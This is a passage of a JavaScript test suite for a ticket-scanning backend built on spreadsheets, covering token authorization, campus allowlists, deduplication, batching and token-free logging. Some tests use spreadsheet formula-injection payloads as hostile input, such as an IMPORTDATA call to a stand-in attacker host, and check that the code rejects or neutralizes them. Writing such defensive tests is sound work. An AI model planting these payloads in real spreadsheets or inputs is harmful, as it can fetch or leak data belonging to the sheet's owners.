const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const vm = require('node:vm');

const VALID_TOKEN = 'a'.repeat(64);
const UNKNOWN_TOKEN = 'c'.repeat(64);
const INACTIVE_TOKEN = 'b'.repeat(64);
const CONFIGURED_TOKEN = 'd'.repeat(64);
const INTO_TOKEN = '1'.repeat(64);
const GEDU_TOKEN = '2'.repeat(64);
const BURGSB_TOKEN = '3'.repeat(64);
const SCAN_SPREADSHEET_ID = '1FairScanWorkbookIdForAuthorizationTests';

function sha256(value) {
  return crypto.createHash('sha256').update(value, 'utf8').digest('hex');
}

class FakeRange {
  constructor(sheet, row, column, numRows = 1, numColumns = 1) {
    this.sheet = sheet;
    this.row = row;
    this.column = column;
    this.numRows = numRows;
    this.numColumns = numColumns;
  }

  getValues() {
    // row 1 is always a one-row header check (requireSheetWithHeaders);
    // row 2+ is always a real data read (readDataRows). Tracking them
    // separately lets tests measure the expensive part in isolation from
    // the constant, cheap per-request header check.
    this.sheet.recordRead(this.numRows, this.row === 1);
    return Array.from({ length: this.numRows }, (_, rowOffset) =>
      Array.from({ length: this.numColumns }, (_, columnOffset) =>
        this.sheet.rows[this.row - 1 + rowOffset]?.[this.column - 1 + columnOffset] ?? ''
      )
    );
  }

  setValues(values) {
    if (this.sheet.failNextWrite) {
      this.sheet.failNextWrite = false;
      throw new Error('Simulated Sheets write failure');
    }
    this.sheet.recordWrite(this.numRows);
    for (let rowOffset = 0; rowOffset < this.numRows; rowOffset += 1) {
      for (let columnOffset = 0; columnOffset < this.numColumns; columnOffset += 1) {
        this.sheet.setCell(
          this.row + rowOffset,
          this.column + columnOffset,
          values[rowOffset][columnOffset]
        );
      }
    }
    return this;
  }

  setValue(value) {
    this.sheet.setCell(this.row, this.column, value);
    return this;
  }

  getValue() {
    return this.getValues()[0][0];
  }

  setFontWeight() {
    return this;
  }

  getRow() {
    return this.row;
  }

  getNumRows() {
    return this.numRows;
  }
}

class FakeSheet {
  constructor(name, rows = [], stats) {
    this.name = name;
    this.rows = rows.map(row => [...row]);
    this.stats = stats;
    this.failNextWrite = false;
  }

  recordRead(numRows, isHeaderCheck) {
    if (!this.stats) return;
    this.stats.readCalls[this.name] = (this.stats.readCalls[this.name] || 0) + 1;
    this.stats.readRows[this.name] = (this.stats.readRows[this.name] || 0) + numRows;
    if (!isHeaderCheck) {
      this.stats.dataReadCalls[this.name] = (this.stats.dataReadCalls[this.name] || 0) + 1;
      this.stats.dataReadRows[this.name] = (this.stats.dataReadRows[this.name] || 0) + numRows;
    }
  }

  recordWrite(numRows) {
    if (!this.stats) return;
    this.stats.writeCalls[this.name] = (this.stats.writeCalls[this.name] || 0) + 1;
    this.stats.writeRows[this.name] = (this.stats.writeRows[this.name] || 0) + numRows;
  }

  getName() {
    return this.name;
  }

  getLastRow() {
    return this.rows.length;
  }

  getLastColumn() {
    return this.rows.reduce((max, row) => Math.max(max, row.length), 0);
  }

  getRange(row, column, numRows = 1, numColumns = 1) {
    return new FakeRange(this, row, column, numRows, numColumns);
  }

  appendRow(row) {
    this.recordWrite(1);
    this.rows.push([...row]);
    return this;
  }

  setCell(row, column, value) {
    while (this.rows.length < row) this.rows.push([]);
    while (this.rows[row - 1].length < column) this.rows[row - 1].push('');
    this.rows[row - 1][column - 1] = value;
  }
}

class FakeSpreadsheet {
  constructor(sheetDefinitions) {
    this.stats = {
      readCalls: {},
      readRows: {},
      dataReadCalls: {},
      dataReadRows: {},
      writeCalls: {},
      writeRows: {}
    };
    this.sheets = new Map(
      Object.entries(sheetDefinitions).map(([name, rows]) => [name, new FakeSheet(name, rows, this.stats)])
    );
  }

  getSheetByName(name) {
    return this.sheets.get(name) ?? null;
  }

  insertSheet(name) {
    const sheet = new FakeSheet(name, [], this.stats);
    this.sheets.set(name, sheet);
    return sheet;
  }

  getId() {
    return SCAN_SPREADSHEET_ID;
  }
}

class FakeCache {
  constructor() {
    this.store = new Map();
  }

  get(key) {
    return this.store.has(key) ? this.store.get(key) : null;
  }

  put(key, value) {
    // TTL is intentionally ignored here: tests simulate "the TTL elapsed"
    // by explicitly calling remove()/clear() rather than by waiting, since
    // this is a fake, in-process cache with no real clock.
    this.store.set(key, String(value));
  }

  remove(key) {
    this.store.delete(key);
  }

  clear() {
    this.store.clear();
  }
}

function defaultSheets() {
  return {
    Raw_Scans: [
      ['Timestamp', 'Uni_ID', 'UUID', 'Campus']
    ],
    participant_url: [
      ['Participant_Name', 'Participant_ID', 'Token_Hash', 'Active', 'Scanner_URL'],
      [
        'Constructor University',
        'constructor',
        sha256(VALID_TOKEN),
        true,
        `https://scanner.example/?uni=constructor#token=${VALID_TOKEN}`
      ],
      [
        'Inactive University',
        'inactive',
        sha256(INACTIVE_TOKEN),
        false,
        `https://scanner.example/?uni=inactive#token=${INACTIVE_TOKEN}`
      ],
      [
        'IE University',
        'ieu',
        sha256(CONFIGURED_TOKEN),
        true,
        `https://scanner.example/?uni=ieu#token=${CONFIGURED_TOKEN}`
      ],
      [
        'INTO',
        'into',
        sha256(INTO_TOKEN),
        true,
        `https://scanner.example/?uni=into#token=${INTO_TOKEN}`
      ],
      [
        'GEDU',
        'gedu',
        sha256(GEDU_TOKEN),
        true,
        `https://scanner.example/?uni=gedu#token=${GEDU_TOKEN}`
      ],
      [
        'Burgundy School of Business',
        'burgsb',
        sha256(BURGSB_TOKEN),
        true,
        `https://scanner.example/?uni=burgsb#token=${BURGSB_TOKEN}`
      ]
    ],
    valid_tickets: [
      ['UUID'],
      ['A1B2C3D4'],
      ['12345678'],
      ['CAMP0001'],
      ['CAMP0002'],
      ['CAMP0003'],
      ['CAMP0004'],
      ['CAMP0005']
    ]
  };
}

function createEnvironment(
  sheetDefinitions = defaultSheets(),
  {
    activeSpreadsheetAvailable = true,
    configuredSpreadsheetId = SCAN_SPREADSHEET_ID,
    lockContended = false
  } = {}
) {
  const spreadsheet = new FakeSpreadsheet(sheetDefinitions);
  let lockReleases = 0;
  const lockEvents = [];
  const loggedErrors = [];
  const loggedWarnings = [];
  const loggedInfo = [];
  const openedSpreadsheetIds = [];
  const scriptProperties = new Map();
  const cache = new FakeCache();
  if (configuredSpreadsheetId) {
    scriptProperties.set('SCAN_SPREADSHEET_ID', configuredSpreadsheetId);
  }
  const context = {
    console: {
      error(message) { loggedErrors.push(String(message)); },
      warn(message) { loggedWarnings.push(String(message)); },
      log(message) { loggedInfo.push(String(message)); }
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput(text) {
        return {
          text,
          setMimeType() { return this; }
        };
      }
    },
    CacheService: {
      getScriptCache() { return cache; }
    },
    LockService: {
      getScriptLock() {
        return {
          waitLock() {
            if (lockContended) {
              throw new Error('Could not obtain lock');
            }
          },
          releaseLock() {
            lockReleases += 1;
            lockEvents.push('release');
          }
        };
      }
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => activeSpreadsheetAvailable ? spreadsheet : null,
      flush() { lockEvents.push('flush'); },
      openById(id) {
        openedSpreadsheetIds.push(id);
        if (id !== SCAN_SPREADSHEET_ID) throw new Error('Unexpected spreadsheet ID');
        return spreadsheet;
      }
    },
    PropertiesService: {
      getScriptProperties() {
        return {
          getProperty: key => scriptProperties.get(key) ?? null,
          setProperty(key, value) {
            scriptProperties.set(key, value);
          }
        };
      }
    },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'SHA_256' },
      Charset: { UTF_8: 'UTF_8' },
      computeDigest(algorithm, value) {
        assert.equal(algorithm, 'SHA_256');
        return [...crypto.createHash('sha256').update(value, 'utf8').digest()]
          .map(byte => byte > 127 ? byte - 256 : byte);
      }
    }
  };

  vm.createContext(context);
  vm.runInContext(fs.readFileSync('Code.gs', 'utf8'), context, { filename: 'Code.gs' });
  return {
    context,
    spreadsheet,
    cache,
    loggedErrors,
    loggedWarnings,
    loggedInfo,
    openedSpreadsheetIds,
    scriptProperties,
    stats: spreadsheet.stats,
    lockReleases: () => lockReleases,
    lockEvents: () => [...lockEvents]
  };
}

function parseResponse(output) {
  return JSON.parse(output.text);
}

function postRequest(context, {
  participantId = 'constructor',
  token = VALID_TOKEN,
  uuid = 'A1B2C3D4',
  timestamp = '2026-07-27T12:00:00.000Z',
  campus
} = {}) {
  const parameter = { participant_id: participantId, token, uuid, timestamp };
  if (campus !== undefined) {
    parameter.campus = campus;
  }
  return parseResponse(context.doPost({
    parameter,
    postData: {
      type: 'application/x-www-form-urlencoded',
      contents: new URLSearchParams(parameter).toString()
    }
  }));
}

let clientIdCounter = 0;

function scanInput(overrides = {}) {
  clientIdCounter += 1;
  return {
    client_id: overrides.clientId ?? `client-${clientIdCounter}`,
    participant_id: overrides.participantId ?? 'constructor',
    token: overrides.token ?? VALID_TOKEN,
    uuid: overrides.uuid ?? 'A1B2C3D4',
    timestamp: overrides.timestamp ?? '2026-07-27T12:00:00.000Z',
    campus: overrides.campus
  };
}

function postBatch(context, overridesList) {
  const scans = overridesList.map(scanInput);
  const response = parseResponse(context.doPost({
    parameter: {},
    postData: {
      type: 'application/json',
      contents: JSON.stringify({ scans })
    }
  }));
  return { results: response.results, scans };
}

function resultFor(batchResult, clientId) {
  return batchResult.results.find(result => result.client_id === clientId);
}

{
  const { context, spreadsheet, lockReleases, lockEvents, loggedInfo } = createEnvironment();
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  assert.deepEqual(parseResponse(context.doGet({ parameter: {} })), {
    result: 'error',
    code: 'method_not_allowed'
  });
  assert.equal(rawScans.getLastRow(), 1, 'GET must never append a scan');

  assert.deepEqual(postRequest(context), {
    result: 'success',
    duplicate: false
  });
  assert.equal(rawScans.getLastRow(), 2);
  assert.equal(rawScans.rows[1][1], 'constructor');
  assert.equal(rawScans.rows[1][2], 'A1B2C3D4');
  assert.equal(rawScans.rows[1][3], '', 'unconfigured institution must get a blank Campus cell');
  assert.equal(lockReleases(), 1);
  assert.deepEqual(
    lockEvents(),
    ['flush', 'release'],
    'pending spreadsheet writes must flush before releasing the script lock'
  );
  assert.equal(loggedInfo.length, 0, 'a first-time accepted scan is not a duplicate event');

  assert.deepEqual(postRequest(context), {
    result: 'success',
    duplicate: true
  });
  assert.equal(rawScans.getLastRow(), 2, 'duplicate scans must not append');
  // A cache-confirmed duplicate is resolved before the lock is ever taken,
  // so lockReleases must NOT increase again here: this is the point of the
  // high-volume optimization (duplicates cost zero lock contention).
  assert.equal(lockReleases(), 1, 'a cache-confirmed duplicate must not acquire the lock at all');
  assert.deepEqual(lockEvents(), ['flush', 'release']);
  assert.equal(loggedInfo.length, 1, 'a duplicate scan logs one informational event');
  const duplicateEvent = JSON.parse(loggedInfo[0]);
  assert.equal(duplicateEvent.event, 'scan_duplicate');
  assert.equal(duplicateEvent.participantId, 'constructor');
  assert.equal(duplicateEvent.uuid, 'A1B2C3D4');
  assert.doesNotMatch(loggedInfo[0], new RegExp(VALID_TOKEN));
}

for (const [label, request, expectedCode] of [
  ['mismatched participant ID', { participantId: 'ie' }, 'unauthorized'],
  ['unknown token', { token: UNKNOWN_TOKEN }, 'unauthorized'],
  ['inactive participant', { participantId: 'inactive', token: INACTIVE_TOKEN }, 'unauthorized'],
  ['unknown ticket', { uuid: 'ZZZZZZZZ' }, 'invalid_ticket'],
  ['short token', { token: 'abc' }, 'invalid_request'],
  ['lowercase ticket', { uuid: 'a1b2c3d4' }, 'invalid_request'],
  ['formula participant', { participantId: '=IMPORTDATA' }, 'invalid_request'],
  ['invalid timestamp', { timestamp: 'not-a-date' }, 'invalid_request'],
  ['unconfigured institution cannot accept an arbitrary campus', { campus: 'Anywhere' }, 'invalid_campus'],
  [
    'participant-ID tampering is still unauthorized when campus is present',
    { participantId: 'sommet', token: CONFIGURED_TOKEN, campus: 'Madrid' },
    'unauthorized'
  ]
]) {
  const { context, spreadsheet, loggedWarnings, loggedErrors } = createEnvironment();
  const response = postRequest(context, request);
  assert.equal(response.result, 'error', label);
  assert.equal(response.code, expectedCode, label);
  assert.equal(
    spreadsheet.getSheetByName('Raw_Scans').getLastRow(),
    1,
    `${label} must not append`
  );
  assert.doesNotMatch(JSON.stringify(response), new RegExp(request.token ?? VALID_TOKEN));

  assert.equal(loggedWarnings.length, 1, `${label} must log exactly one diagnostic warning`);
  assert.equal(loggedErrors.length, 0, `${label} is an expected rejection, not a server error`);
  const logged = JSON.parse(loggedWarnings[0]);
  assert.equal(logged.event, 'scan_rejected', label);
  assert.equal(logged.code, expectedCode, label);
  assert.doesNotMatch(loggedWarnings[0], new RegExp(request.token ?? VALID_TOKEN), `${label} must never log the token`);
  assert.doesNotMatch(loggedWarnings[0], new RegExp(sha256(request.token ?? VALID_TOKEN)), `${label} must never log a token hash`);
}

{
  const sheets = defaultSheets();
  delete sheets.valid_tickets;
  const { context, loggedErrors, loggedWarnings } = createEnvironment(sheets);
  const response = postRequest(context);
  assert.deepEqual(response, { result: 'error', code: 'server_error' });
  assert.equal(loggedErrors.length, 1);
  assert.equal(loggedWarnings.length, 0, 'a server exception is not an expected rejection');
  assert.doesNotMatch(JSON.stringify(response), new RegExp(VALID_TOKEN));

  const logged = JSON.parse(loggedErrors[0]);
  assert.equal(logged.event, 'scan_error');
  assert.equal(logged.code, 'server_error');
  assert.equal(logged.participantId, 'constructor');
  assert.equal(logged.uuid, 'A1B2C3D4');
  assert.match(logged.message, /Missing required scanner sheet: valid_tickets/);
  assert.doesNotMatch(loggedErrors[0], new RegExp(VALID_TOKEN), 'server error log must never contain the token');
}

{
  // Lock contention is transient and must be diagnosable without ever
  // logging the credential that authorized the request.
  const { context, spreadsheet, loggedWarnings, loggedErrors } = createEnvironment(
    defaultSheets(),
    { lockContended: true }
  );
  const response = postRequest(context);
  assert.deepEqual(response, { result: 'error', code: 'server_busy' });
  assert.equal(spreadsheet.getSheetByName('Raw_Scans').getLastRow(), 1);
  assert.equal(loggedErrors.length, 0, 'lock contention is expected, not a server exception');
  assert.equal(loggedWarnings.length, 1);

  const logged = JSON.parse(loggedWarnings[0]);
  assert.equal(logged.event, 'scan_rejected');
  assert.equal(logged.code, 'server_busy');
  assert.equal(logged.participantId, 'constructor');
  assert.equal(logged.uuid, 'A1B2C3D4');
  assert.doesNotMatch(loggedWarnings[0], new RegExp(VALID_TOKEN));
}

// --- Campus Intent Capture ---

{
  const { context, spreadsheet } = createEnvironment();
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  assert.deepEqual(
    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0001', campus: 'Madrid' }),
    { result: 'success', duplicate: false },
    'a valid configured campus must be accepted'
  );
  assert.equal(rawScans.rows[1][3], 'Madrid');

  assert.deepEqual(
    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0002', campus: 'Undecided' }),
    { result: 'success', duplicate: false },
    'Undecided must be accepted'
  );
  assert.equal(rawScans.rows[2][3], 'Undecided');
}

{
  // A configured institution's older queued scans may legitimately omit
  // campus entirely; the backend must still accept them.
  const { context, spreadsheet } = createEnvironment();
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  assert.deepEqual(
    postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0001' }),
    { result: 'success', duplicate: false }
  );
  assert.equal(rawScans.rows[1][3], '');
}

for (const [participantId, token, uuid, validCampus, invalidCampus] of [
  ['into', INTO_TOKEN, 'CAMP0003', 'UAE', 'Germany'],
  ['gedu', GEDU_TOKEN, 'CAMP0004', 'Malta', 'Nicosia'],
  ['burgsb', BURGSB_TOKEN, 'CAMP0005', 'Lyon', 'Madrid']
]) {
  const { context, spreadsheet, loggedWarnings } = createEnvironment();
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  assert.deepEqual(
    postRequest(context, { participantId, token, uuid, campus: validCampus }),
    { result: 'success', duplicate: false },
    `${participantId} must accept its configured campus "${validCampus}"`
  );
  assert.equal(rawScans.rows[1][3], validCampus);

  const rejection = postRequest(context, { participantId, token, uuid, campus: invalidCampus });
  assert.deepEqual(
    rejection,
    { result: 'error', code: 'invalid_campus' },
    `${participantId} must reject a campus outside its allowlist ("${invalidCampus}")`
  );
  assert.equal(rawScans.getLastRow(), 2, `${participantId} rejected campus must not append a row`);

  assert.equal(loggedWarnings.length, 1, `${participantId} rejected campus must log one diagnostic`);
  const logged = JSON.parse(loggedWarnings[0]);
  assert.equal(logged.code, 'invalid_campus');
  assert.equal(logged.participantId, participantId);
  assert.equal(logged.uuid, uuid);
  assert.equal(logged.campus, invalidCampus, 'the rejected campus value must be diagnosable');
  assert.doesNotMatch(loggedWarnings[0], new RegExp(token));
}

for (const [label, campus] of [
  ['a campus outside the participant allowlist', 'Barcelona'],
  ['an arbitrary formula-shaped campus value', '=IMPORTDATA("https://attacker.example")']
]) {
  const { context, spreadsheet } = createEnvironment();
  const response = postRequest(context, {
    participantId: 'ieu',
    token: CONFIGURED_TOKEN,
    uuid: 'CAMP0001',
    campus
  });
  assert.deepEqual(response, { result: 'error', code: 'invalid_campus' }, label);
  assert.equal(
    spreadsheet.getSheetByName('Raw_Scans').getLastRow(),
    1,
    `${label} must not append a row`
  );
}

{
  // Campus validation is scoped to the authenticated participant: a value
  // valid for one institution must not be accepted for another.
  const { context, spreadsheet } = createEnvironment();
  const response = postRequest(context, {
    participantId: 'constructor',
    token: VALID_TOKEN,
    campus: 'Madrid'
  });
  assert.deepEqual(response, { result: 'error', code: 'invalid_campus' });
  assert.equal(spreadsheet.getSheetByName('Raw_Scans').getLastRow(), 1);
}

{
  // Duplicate handling remains idempotent and campus-aware: a repeat scan
  // for the same institution + UUID must not create a second row, even
  // when a (potentially different) campus value is supplied.
  const { context, spreadsheet, loggedInfo } = createEnvironment();
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CAMP0001', campus: 'Madrid' });
  const duplicateResponse = postRequest(context, {
    participantId: 'ieu',
    token: CONFIGURED_TOKEN,
    uuid: 'CAMP0001',
    campus: 'Segovia'
  });
  assert.deepEqual(duplicateResponse, { result: 'success', duplicate: true });
  assert.equal(rawScans.getLastRow(), 2, 'duplicate scans must not append a second row');
  assert.equal(rawScans.rows[1][3], 'Madrid', 'the original accepted campus must be unchanged');

  assert.equal(loggedInfo.length, 1, 'only the duplicate attempt logs an informational event');
  const duplicateEvent = JSON.parse(loggedInfo[0]);
  assert.equal(duplicateEvent.event, 'scan_duplicate');
  assert.equal(duplicateEvent.participantId, 'ieu');
  assert.equal(duplicateEvent.uuid, 'CAMP0001');
  assert.equal(duplicateEvent.campus, 'Segovia', 'logs the campus submitted with the duplicate attempt');
  assert.doesNotMatch(loggedInfo[0], new RegExp(CONFIGURED_TOKEN));
}

{
  const harness = createEnvironment(defaultSheets(), {
    activeSpreadsheetAvailable: false
  });
  assert.deepEqual(postRequest(harness.context), {
    result: 'success',
    duplicate: false
  });
  assert.deepEqual(harness.openedSpreadsheetIds, [SCAN_SPREADSHEET_ID]);
}

{
  const harness = createEnvironment(defaultSheets(), {
    activeSpreadsheetAvailable: false,
    configuredSpreadsheetId: null
  });
  assert.deepEqual(postRequest(harness.context), {
    result: 'error',
    code: 'server_error'
  });
  assert.deepEqual(harness.openedSpreadsheetIds, []);
}

{
  const harness = createEnvironment(defaultSheets(), {
    configuredSpreadsheetId: null
  });
  harness.context.setup();
  assert.equal(
    harness.scriptProperties.get('SCAN_SPREADSHEET_ID'),
    SCAN_SPREADSHEET_ID
  );
}

// --- Safe Raw_Scans migration helper ---

{
  // A pre-migration production sheet: only the legacy three headers, with
  // existing rows that must be left untouched.
  const sheets = {
    Raw_Scans: [
      ['Timestamp', 'Uni_ID', 'UUID'],
      ['2026-01-01T00:00:00.000Z', 'constructor', 'A1B2C3D4']
    ],
    participant_url: defaultSheets().participant_url,
    valid_tickets: defaultSheets().valid_tickets
  };
  const harness = createEnvironment(sheets);
  const rawScans = harness.spreadsheet.getSheetByName('Raw_Scans');

  const result = harness.context.migrateRawScansAddCampusColumn();
  assert.equal(result.migrated, true);
  assert.equal(result.alreadyPresent, false);
  assert.equal(rawScans.rows[0][3], 'Campus');
  assert.deepEqual(
    rawScans.rows[1],
    ['2026-01-01T00:00:00.000Z', 'constructor', 'A1B2C3D4'],
    'existing rows must not be modified'
  );

  const secondRun = harness.context.migrateRawScansAddCampusColumn();
  assert.equal(secondRun.migrated, false);
  assert.equal(secondRun.alreadyPresent, true);
}

{
  const sheets = {
    Raw_Scans: [
      ['Timestamp', 'Uni_ID', 'Ticket']
    ],
    participant_url: defaultSheets().participant_url,
    valid_tickets: defaultSheets().valid_tickets
  };
  const harness = createEnvironment(sheets);
  assert.throws(
    () => harness.context.migrateRawScansAddCampusColumn(),
    /does not have the expected Timestamp, Uni_ID, UUID headers/
  );
}

for (const value of [
  '=IMPORTDATA("https://attacker.example")',
  "'=1+1",
  "''+SUM(A:A)",
  '+SUM(A:A)',
  '-1+1',
  '@SUM(A:A)',
  '\t=1+1',
  '\r=1+1',
  '\n=1+1',
  '＝1+1',
  '＋1+1',
  '－1+1',
  '＠1+1'
]) {
  const { context } = createEnvironment();
  assert.equal(context.neutralizeFormula(value), `'${value}`);
}

// --- High-volume batch synchronization ---

{
  // 6 rapid scans from one institution, sent as a single batch request
  // (simulating a volunteer scanning 5-6 visitors back-to-back).
  const sheets = defaultSheets();
  sheets.valid_tickets.push(['BURST001'], ['BURST002'], ['BURST003'], ['BURST004'], ['BURST005'], ['BURST006']);
  const { context, spreadsheet, stats } = createEnvironment(sheets);
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  const uuids = ['BURST001', 'BURST002', 'BURST003', 'BURST004', 'BURST005', 'BURST006'];
  const batch = postBatch(context, uuids.map(uuid => ({ uuid })));

  assert.equal(batch.results.length, 6, 'every scan in the batch gets its own result');
  for (const scan of batch.scans) {
    const result = resultFor(batch, scan.client_id);
    assert.deepEqual(result, { client_id: scan.client_id, result: 'success', duplicate: false });
  }
  assert.equal(rawScans.getLastRow(), 7, 'all 6 scans land as 6 new rows');

  // The whole burst produced at most one Raw_Scans data read (the pre-lock
  // duplicate pre-check — here the sheet started empty so it short-circuits
  // without even reading) and exactly one Raw_Scans write (the batched
  // range write) — not one of each per scan.
  assert.ok((stats.dataReadCalls.Raw_Scans || 0) <= 1, 'at most one Raw_Scans data read covers the whole batch, not one per scan');
  assert.equal(stats.writeCalls.Raw_Scans, 1, 'one batched write covers the whole batch');
  assert.equal(stats.writeRows.Raw_Scans, 6, 'the single write carries all 6 rows');
}

{
  // MAX_BATCH_SIZE (10) is a transport limit, not a cap on how many scans
  // can ever be accepted: the frontend never sends more than 10 per
  // request, chunking any larger backlog across consecutive requests
  // instead. A single request that still arrives oversized (only possible
  // from a non-conforming client) is rejected outright rather than
  // silently truncated, so none of its scans are ever dropped with no
  // result at all — and it must not write anything.
  const sheets = defaultSheets();
  const uuids = [];
  for (let i = 0; i < 12; i += 1) {
    const uuid = 'OVER' + String(i).padStart(4, '0');
    uuids.push(uuid);
    sheets.valid_tickets.push([uuid]);
  }
  const { context, spreadsheet } = createEnvironment(sheets);
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');
  const batch = postBatch(context, uuids.map(uuid => ({ uuid })));
  assert.equal(batch.results.length, 12, 'every submitted scan gets its own result, none silently dropped');
  for (const scan of batch.scans) {
    const result = resultFor(batch, scan.client_id);
    assert.deepEqual(result, { client_id: scan.client_id, result: 'error', code: 'invalid_request' });
  }
  assert.equal(rawScans.getLastRow(), 1, 'an oversized request writes nothing');
}

{
  // The same UUID is independently valid for different institutions, and a
  // mixed batch (success, duplicate, rejection, and a transient failure)
  // must resolve every item independently without losing any of them.
  const sheets = defaultSheets();
  sheets.valid_tickets.push(['SHARE001']);
  const { context, spreadsheet } = createEnvironment(sheets);
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  // Pre-seed a duplicate: SKEMA-equivalent (constructor) already scanned
  // A1B2C3D4 once before this batch.
  postRequest(context, { uuid: 'A1B2C3D4' });

  const batch = postBatch(context, [
    { uuid: 'SHARE001', participantId: 'constructor', token: VALID_TOKEN }, // new, valid
    { uuid: 'SHARE001', participantId: 'ieu', token: CONFIGURED_TOKEN }, // same UUID, different institution: also valid
    { uuid: 'A1B2C3D4', participantId: 'constructor', token: VALID_TOKEN }, // duplicate of the pre-seeded scan
    { uuid: 'ZZZZZZZZ', participantId: 'constructor', token: VALID_TOKEN }, // unknown ticket: permanent rejection
    { uuid: 'CAMP0001', participantId: 'ieu', token: CONFIGURED_TOKEN, campus: 'NotARealCampus' } // invalid campus
  ]);

  assert.equal(resultFor(batch, batch.scans[0].client_id).result, 'success');
  assert.equal(resultFor(batch, batch.scans[0].client_id).duplicate, false);
  assert.equal(resultFor(batch, batch.scans[1].client_id).result, 'success');
  assert.equal(resultFor(batch, batch.scans[1].client_id).duplicate, false, 'SKEMA+UUID and INTO+UUID (here: constructor+ieu) are independently valid');
  assert.equal(resultFor(batch, batch.scans[2].client_id).duplicate, true);
  assert.equal(resultFor(batch, batch.scans[3].client_id).code, 'invalid_ticket');
  assert.equal(resultFor(batch, batch.scans[4].client_id).code, 'invalid_campus');

  assert.equal(rawScans.getLastRow(), 4, 'only the two genuinely new scans (plus the pre-seeded one) were written');
}

{
  // 30 simulated institutions, each independently scanning the same
  // visitor's UUID. Every institution + UUID pair must succeed.
  const sheets = defaultSheets();
  const institutionCount = 30;
  const sharedUuid = 'FAIR0001';
  sheets.valid_tickets.push([sharedUuid]);
  const tokens = [];
  for (let i = 0; i < institutionCount; i += 1) {
    const participantId = 'inst' + i;
    const token = sha256('institution-token-' + i);
    tokens.push(token);
    sheets.participant_url.push([
      'Institution ' + i,
      participantId,
      sha256(token),
      true,
      `https://scanner.example/?uni=${participantId}#token=${token}`
    ]);
  }

  const { context, spreadsheet } = createEnvironment(sheets);
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  for (let i = 0; i < institutionCount; i += 1) {
    const response = postRequest(context, {
      participantId: 'inst' + i,
      token: tokens[i],
      uuid: sharedUuid
    });
    assert.deepEqual(
      response,
      { result: 'success', duplicate: false },
      `institution ${i} must independently accept the shared UUID`
    );
  }

  assert.equal(rawScans.getLastRow(), 1 + institutionCount, 'one row per institution, no cross-institution deduplication');

  // Scanning again for institution 0 must be an idempotent duplicate.
  assert.deepEqual(
    postRequest(context, { participantId: 'inst0', token: tokens[0], uuid: sharedUuid }),
    { result: 'success', duplicate: true }
  );
  assert.equal(rawScans.getLastRow(), 1 + institutionCount, 'the re-scan for institution 0 must not add a row');
}

{
  // Offline backlog reconnecting: a device was offline and queued several
  // scans locally, then sends them all in one batch once back online.
  const sheets = defaultSheets();
  sheets.valid_tickets.push(['OFFLINE1'], ['OFFLINE2'], ['OFFLINE3']);
  const { context, spreadsheet } = createEnvironment(sheets);
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');

  const batch = postBatch(context, [
    { uuid: 'OFFLINE1' },
    { uuid: 'OFFLINE2' },
    { uuid: 'OFFLINE3' }
  ]);
  assert.ok(batch.results.every(result => result.result === 'success' && result.duplicate === false));
  assert.equal(rawScans.getLastRow(), 4);
}

{
  // server_busy affects every item in the batch, and none of them are
  // silently dropped.
  const sheets = defaultSheets();
  sheets.valid_tickets.push(['BUSY0001'], ['BUSY0002'], ['BUSY0003']);
  const { context, spreadsheet, loggedWarnings } = createEnvironment(sheets, { lockContended: true });
  const batch = postBatch(context, [
    { uuid: 'BUSY0001' },
    { uuid: 'BUSY0002' },
    { uuid: 'BUSY0003' }
  ]);
  assert.equal(batch.results.length, 3);
  assert.ok(batch.results.every(result => result.result === 'error' && result.code === 'server_busy'));
  assert.equal(spreadsheet.getSheetByName('Raw_Scans').getLastRow(), 1, 'nothing was written');
  assert.equal(loggedWarnings.length, 3, 'each affected scan gets its own diagnostic log line');
}

{
  // A write failure partway through must not silently drop scans: anything
  // not confirmed written comes back as a diagnosable server_error, and
  // whatever was already resolved (e.g. a cache-confirmed duplicate ahead
  // of it in the same batch) is unaffected.
  const sheets = defaultSheets();
  sheets.valid_tickets.push(['FAILWRT1'], ['FAILWRT2']);
  const { context, spreadsheet, loggedErrors } = createEnvironment(sheets);
  const rawScans = spreadsheet.getSheetByName('Raw_Scans');
  rawScans.failNextWrite = true;

  const batch = postBatch(context, [
    { uuid: 'FAILWRT1' },
    { uuid: 'FAILWRT2' }
  ]);
  assert.equal(batch.results.length, 2, 'no scan is dropped from the response even though the write failed');
  assert.ok(batch.results.every(result => result.result === 'error' && result.code === 'server_error'));
  assert.equal(rawScans.getLastRow(), 1, 'a failed write must not leave a partial row');
  assert.equal(loggedErrors.length, 2, 'each unresolved scan in the failed write is logged individually');
}

// --- Caching: valid_tickets ---

{
  // A ticket confirmed once (e.g. scanned by the first institution a
  // visitor visits) is served from cache for every subsequent institution,
  // without reading valid_tickets again.
  const sheets = defaultSheets();
  sheets.valid_tickets.push(['CACHE001']);
  const { context, stats } = createEnvironment(sheets);

  postRequest(context, { uuid: 'CACHE001' });
  const dataReadsAfterFirst = stats.dataReadCalls.valid_tickets;
  assert.ok(dataReadsAfterFirst >= 1, 'the first lookup of a never-before-seen ticket reads the sheet');

  postRequest(context, { participantId: 'ieu', token: CONFIGURED_TOKEN, uuid: 'CACHE001', campus: 'Madrid' });
  assert.equal(
    stats.dataReadCalls.valid_tickets,
    dataReadsAfterFirst,
    'a second institution scanning the same already-confirmed ticket must not read valid_tickets data again'
  );
}

{
  // Cache misses always fall back to a live read, so a newly added ticket
  // becomes usable immediately, and an unknown UUID is never authorized
  // just because it was checked before.
  const sheets = defaultSheets();
  const { context, spreadsheet } = createEnvironment(sheets);
